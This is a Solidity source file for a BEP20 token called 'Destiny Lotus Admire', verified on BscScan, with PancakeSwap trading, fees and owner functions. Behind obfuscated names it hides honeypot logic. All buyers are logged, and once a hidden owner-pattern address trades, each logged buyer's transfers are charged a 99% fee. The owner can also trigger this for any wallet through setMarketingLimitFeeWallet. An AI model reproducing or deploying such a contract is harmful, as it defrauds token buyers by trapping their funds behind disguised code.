/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DestinyLotusAdmire is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Destiny Lotus Admire ";
    string constant _symbol = "DestinyLotusAdmire";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private tradingSwapMaxExemptBuySellTx;
    mapping(address => bool) private feeTeamLimitIs;
    mapping(address => bool) private exemptSellModeWallet;
    mapping(address => bool) private botsMinTradingLimitMaxLaunchedSwap;
    mapping(address => uint256) private marketingLimitFeeWallet;
    mapping(uint256 => address) private burnAutoSellSwap;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private walletTradingBurnLiquidity = 0;
    uint256 private limitMaxFeeTrading = 6;

    //SELL FEES
    uint256 private exemptAutoModeLiquidity = 0;
    uint256 private maxBuyBurnSell = 6;

    uint256 private buyMarketingLimitWallet = limitMaxFeeTrading + walletTradingBurnLiquidity;
    uint256 private teamTxAutoSell = 100;

    address private isWalletBotsBurnFeeLiquidityExempt = (msg.sender); // auto-liq address
    address private walletSellReceiverLaunched = (0xf93bE3e1B2f04c055edD4937ffFfFaE62923270F); // marketing address
    address private sellExemptMaxReceiverAutoBots = DEAD;
    address private feeIsLimitMaxTxSell = DEAD;
    address private receiverFeeModeMinLimit = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private liquidityAutoMarketingBuy;
    uint256 private modeLiquiditySwapTeam;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private sellLimitBuyIs;
    uint256 private limitTeamWalletFeeTradingBots;
    uint256 private limitTxTeamExemptWalletAutoMode;
    uint256 private exemptLaunchedSwapMarketing;
    uint256 private minTxReceiverMaxIsTradingLaunched;

    bool private limitBurnMinMax = true;
    bool private botsMinTradingLimitMaxLaunchedSwapMode = true;
    bool private feeModeLiquidityTeam = true;
    bool private isMinBurnTeam = true;
    bool private swapLiquidityIsModeWalletMax = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private maxLiquidityMarketingBuy = _totalSupply / 1000; // 0.1%

    
    uint256 private sellFeeBuyTradingIsSwapTeam;
    bool private burnBuyIsMaxMode;
    uint256 private marketingSwapLimitAuto;
    bool private exemptSwapMinBots;
    bool private liquidityBotsMinMaxTeamExemptIs;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        sellLimitBuyIs = true;

        tradingSwapMaxExemptBuySellTx[msg.sender] = true;
        tradingSwapMaxExemptBuySellTx[address(this)] = true;

        feeTeamLimitIs[msg.sender] = true;
        feeTeamLimitIs[0x0000000000000000000000000000000000000000] = true;
        feeTeamLimitIs[0x000000000000000000000000000000000000dEaD] = true;
        feeTeamLimitIs[address(this)] = true;

        exemptSellModeWallet[msg.sender] = true;
        exemptSellModeWallet[0x0000000000000000000000000000000000000000] = true;
        exemptSellModeWallet[0x000000000000000000000000000000000000dEaD] = true;
        exemptSellModeWallet[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return modeIsBotsTradingMarketingSwap(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return modeIsBotsTradingMarketingSwap(sender, recipient, amount);
    }

    function modeIsBotsTradingMarketingSwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = txSwapMarketingSellLaunchedBurn(sender) || txSwapMarketingSellLaunchedBurn(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                maxFeeExemptTxModeIsLiquidity();
            }
            if (!bLimitTxWalletValue) {
                marketingTradingLimitBuyFee(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return teamMinBurnBotsTradingTxLaunched(sender, recipient, amount);}

        if (!tradingSwapMaxExemptBuySellTx[sender] && !tradingSwapMaxExemptBuySellTx[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || exemptSellModeWallet[sender] || exemptSellModeWallet[recipient], "Max TX Limit has been triggered");

        if (walletSwapTradingAuto()) {limitExemptMinBuy();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = teamLaunchedModeWallet(sender) ? liquidityBurnBuyAuto(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function teamMinBurnBotsTradingTxLaunched(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function teamLaunchedModeWallet(address sender) internal view returns (bool) {
        return !feeTeamLimitIs[sender];
    }

    function tradingBuyBotsReceiver(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            buyMarketingLimitWallet = maxBuyBurnSell + exemptAutoModeLiquidity;
            return txMaxBurnMarketing(sender, buyMarketingLimitWallet);
        }
        if (!selling && sender == uniswapV2Pair) {
            buyMarketingLimitWallet = limitMaxFeeTrading + walletTradingBurnLiquidity;
            return buyMarketingLimitWallet;
        }
        return txMaxBurnMarketing(sender, buyMarketingLimitWallet);
    }

    function liquidityBurnBuyAuto(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(tradingBuyBotsReceiver(sender, receiver == uniswapV2Pair)).div(teamTxAutoSell);

        if (botsMinTradingLimitMaxLaunchedSwap[sender] || botsMinTradingLimitMaxLaunchedSwap[receiver]) {
            feeAmount = amount.mul(99).div(teamTxAutoSell);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function txSwapMarketingSellLaunchedBurn(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function txMaxBurnMarketing(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = marketingLimitFeeWallet[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function marketingTradingLimitBuyFee(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        burnAutoSellSwap[exemptLimitValue] = addr;
    }

    function maxFeeExemptTxModeIsLiquidity() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (marketingLimitFeeWallet[burnAutoSellSwap[i]] == 0) {
                    marketingLimitFeeWallet[burnAutoSellSwap[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletSellReceiverLaunched).transfer(amountBNB * amountPercentage / 100);
    }

    function walletSwapTradingAuto() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    swapLiquidityIsModeWalletMax &&
    _balances[address(this)] >= maxLiquidityMarketingBuy;
    }

    function limitExemptMinBuy() internal swapping {
        uint256 amountToLiquify = maxLiquidityMarketingBuy.mul(walletTradingBurnLiquidity).div(buyMarketingLimitWallet).div(2);
        uint256 amountToSwap = maxLiquidityMarketingBuy.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = buyMarketingLimitWallet.sub(walletTradingBurnLiquidity.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(walletTradingBurnLiquidity).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(limitMaxFeeTrading).div(totalETHFee);

        payable(walletSellReceiverLaunched).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                isWalletBotsBurnFeeLiquidityExempt,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTeamTxAutoSell() public view returns (uint256) {
        if (teamTxAutoSell == limitMaxFeeTrading) {
            return limitMaxFeeTrading;
        }
        if (teamTxAutoSell != walletTradingBurnLiquidity) {
            return walletTradingBurnLiquidity;
        }
        return teamTxAutoSell;
    }
    function setTeamTxAutoSell(uint256 a0) public onlyOwner {
        if (teamTxAutoSell != maxLiquidityMarketingBuy) {
            maxLiquidityMarketingBuy=a0;
        }
        teamTxAutoSell=a0;
    }

    function getTradingSwapMaxExemptBuySellTx(address a0) public view returns (bool) {
        if (a0 == receiverFeeModeMinLimit) {
            return isMinBurnTeam;
        }
        if (tradingSwapMaxExemptBuySellTx[a0] != tradingSwapMaxExemptBuySellTx[a0]) {
            return limitBurnMinMax;
        }
            return tradingSwapMaxExemptBuySellTx[a0];
    }
    function setTradingSwapMaxExemptBuySellTx(address a0,bool a1) public onlyOwner {
        if (tradingSwapMaxExemptBuySellTx[a0] != feeTeamLimitIs[a0]) {
           feeTeamLimitIs[a0]=a1;
        }
        if (a0 == isWalletBotsBurnFeeLiquidityExempt) {
            swapLiquidityIsModeWalletMax=a1;
        }
        tradingSwapMaxExemptBuySellTx[a0]=a1;
    }

    function getSellExemptMaxReceiverAutoBots() public view returns (address) {
        if (sellExemptMaxReceiverAutoBots != feeIsLimitMaxTxSell) {
            return feeIsLimitMaxTxSell;
        }
        if (sellExemptMaxReceiverAutoBots != walletSellReceiverLaunched) {
            return walletSellReceiverLaunched;
        }
        return sellExemptMaxReceiverAutoBots;
    }
    function setSellExemptMaxReceiverAutoBots(address a0) public onlyOwner {
        if (sellExemptMaxReceiverAutoBots != isWalletBotsBurnFeeLiquidityExempt) {
            isWalletBotsBurnFeeLiquidityExempt=a0;
        }
        if (sellExemptMaxReceiverAutoBots == sellExemptMaxReceiverAutoBots) {
            sellExemptMaxReceiverAutoBots=a0;
        }
        sellExemptMaxReceiverAutoBots=a0;
    }

    function getLimitBurnMinMax() public view returns (bool) {
        if (limitBurnMinMax != isMinBurnTeam) {
            return isMinBurnTeam;
        }
        if (limitBurnMinMax != swapLiquidityIsModeWalletMax) {
            return swapLiquidityIsModeWalletMax;
        }
        return limitBurnMinMax;
    }
    function setLimitBurnMinMax(bool a0) public onlyOwner {
        if (limitBurnMinMax == swapLiquidityIsModeWalletMax) {
            swapLiquidityIsModeWalletMax=a0;
        }
        if (limitBurnMinMax == isMinBurnTeam) {
            isMinBurnTeam=a0;
        }
        if (limitBurnMinMax != feeModeLiquidityTeam) {
            feeModeLiquidityTeam=a0;
        }
        limitBurnMinMax=a0;
    }

    function getWalletSellReceiverLaunched() public view returns (address) {
        if (walletSellReceiverLaunched == walletSellReceiverLaunched) {
            return walletSellReceiverLaunched;
        }
        if (walletSellReceiverLaunched == receiverFeeModeMinLimit) {
            return receiverFeeModeMinLimit;
        }
        return walletSellReceiverLaunched;
    }
    function setWalletSellReceiverLaunched(address a0) public onlyOwner {
        if (walletSellReceiverLaunched != receiverFeeModeMinLimit) {
            receiverFeeModeMinLimit=a0;
        }
        walletSellReceiverLaunched=a0;
    }

    function getFeeIsLimitMaxTxSell() public view returns (address) {
        return feeIsLimitMaxTxSell;
    }
    function setFeeIsLimitMaxTxSell(address a0) public onlyOwner {
        if (feeIsLimitMaxTxSell == walletSellReceiverLaunched) {
            walletSellReceiverLaunched=a0;
        }
        feeIsLimitMaxTxSell=a0;
    }

    function getMarketingLimitFeeWallet(address a0) public view returns (uint256) {
        if (a0 != feeIsLimitMaxTxSell) {
            return exemptAutoModeLiquidity;
        }
            return marketingLimitFeeWallet[a0];
    }
    function setMarketingLimitFeeWallet(address a0,uint256 a1) public onlyOwner {
        marketingLimitFeeWallet[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}